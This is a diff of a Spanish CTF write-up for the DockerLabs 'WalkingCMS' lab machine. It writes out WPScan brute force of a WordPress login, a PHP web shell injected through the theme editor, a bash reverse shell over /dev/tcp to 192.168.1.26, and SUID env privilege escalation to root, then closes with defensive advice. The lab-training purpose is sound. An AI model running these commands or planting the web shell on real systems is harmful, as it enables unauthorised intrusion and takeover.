@@ -1,60 +1,215 @@
-# WALKINGCMS — DockerLabs
+# WalkingCMS — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 09/04/2024  
+**Técnicas:** WordPress · WPScan · Reverse Shell · Theme Editor · File Injection · SUID · GTFOBins
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **WALKINGCMS** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración WordPress](#2-enumeración-wordpress)
+3. [Fuerza bruta WordPress — WPScan](#3-fuerza-bruta-wordpress--wpscan)
+4. [File Injection — Reverse Shell](#4-file-injection--reverse-shell)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar el laboratorio
+Desplegamos el laboratorio:
 
-Ahora haremos un escaneo profundo para ver los puertos abiertos del laboratorio.
+```bash
+sudo bash auto_deploy.sh walkingcms.tar
+```
 
-## 2. Enumeración
+> IP asignada: `172.17.0.2`
 
-Exploramos el servidor web con el que cuentan y vemos que no hay nada.
+Realizamos un escaneo profundo:
 
-Haremos un escaneo rápido con dirb y veremos que cuenta con una pagina de
-Wordpress
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
 
-## 3. Explotación
+Resultado:
 
-Asi que usaremos la herramienta wpscan que es para escanear vulnerabilidades
-en wordpress, enumeraremos para ver si encuentra usuarios, plugins y temas
-vulnerables.
+```text
+80/tcp open http
+```
 
-Vemos que nos encontró un usuario llamado Mario.
+Accedemos al servidor web y observamos únicamente la página por defecto de Apache.
 
-## 4. Post-explotación
+---
 
-Ahora con esa información vamos a hacer otro escaneo para ver si encontramos la
-contraseña.
+## 2. Enumeración WordPress
 
-Al encontrarla, ingresaremos al modo administrador.
+Enumeramos directorios:
+
+```bash
+dirb http://172.17.0.2
+```
+
+Resultado:
+
+```text
+/wordpress/
+```
+
+La aplicación utiliza WordPress.
+
+Utilizamos WPScan para enumerar usuarios, plugins y temas:
+
+```bash
+wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
+```
+
+Resultado:
+
+```text
+Usuario encontrado: mario
+```
+
+---
+
+## 3. Fuerza bruta WordPress — WPScan
+
+Realizamos fuerza bruta sobre el usuario identificado:
+
+```bash
+wpscan --url http://172.17.0.2/wordpress/ \
+--enumerate -U mario \
+-P /usr/share/wordlists/rockyou.txt
+```
+
+Resultado:
+
+```text
+Username: mario
+Password: love
+```
+
+Accedemos al panel administrativo de WordPress:
+
+```text
+http://172.17.0.2/wordpress/wp-login.php
+```
+
+---
+
+## 4. File Injection — Reverse Shell
+
+Dentro del panel de administración utilizamos el editor de temas.
+
+Editamos:
+
+```text
+Appearance → Theme File Editor → index.php
+```
+
+Añadimos una WebShell PHP:
+
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+
+Guardamos los cambios y comprobamos ejecución de comandos:
+
+```text
+http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami
+```
+
+Resultado:
+
+```text
+www-data
+```
+
+Nos ponemos en escucha:
+
+```bash
+sudo nc -lvnp 443
+```
+
+Ejecutamos una reverse shell Bash:
+
+```text
+http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
+```
+
+Obtenemos acceso remoto:
+
+```bash
+whoami
+www-data
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Editaremos el fichero index.php para poder escribir el código que queramos,
-haremos una reverse Shell.
+Intentamos enumerar permisos sudo:
 
-Ahora guardamos y vemos que podemos ejecutar comandos como en una
-consola.
+```bash
+sudo -l
+```
 
-## 6. Lección aprendida
+Sin resultados útiles.
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+Buscamos binarios SUID:
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+```bash
+find / -perm -4000 -user root 2>/dev/null
+```
+
+Resultado relevante:
+
+```text
+/usr/bin/env
+```
+
+Consultamos GTFOBins y ejecutamos:
+
+```bash
+/usr/bin/env /bin/sh -p
+```
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| WordPress accesible públicamente | Superficie de ataque expuesta |
+| Contraseña débil WordPress | Acceso administrador |
+| Theme Editor habilitado | Ejecución remota de código |
+| Reverse Shell PHP | Acceso interactivo al sistema |
+| Binario SUID vulnerable | Escalada a root |
+
+**Para defenderse:**
+
+- Aplicar políticas robustas de contraseñas.
+- Deshabilitar el editor de archivos en WordPress.
+- Restringir permisos sobre archivos PHP críticos.
+- Auditar binarios SUID peligrosos.
+- Limitar ejecución de comandos desde aplicaciones web.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
